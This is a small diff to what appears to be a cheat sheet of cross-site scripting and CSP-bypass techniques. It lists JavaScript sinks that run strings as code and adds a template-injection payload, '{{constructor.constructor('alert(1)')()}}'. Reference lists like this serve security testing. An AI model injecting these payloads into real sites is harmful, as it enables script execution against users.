@@ -156,4 +156,5 @@ if google is allowed as src for scripts then <script src="https://accounts.googl
 - setTimeout: `setTimeout("alert(1)")`
 - setInterval: `setInterval("alert(1)")`
 - Function: `Function("alert(1)")()`
-- constructor: `[].constructor.constructor(alert(1))()`
+- constructor: `[].constructor.constructor('alert(1)')()`
+- {{constructor.constructor('alert(1)')()}}
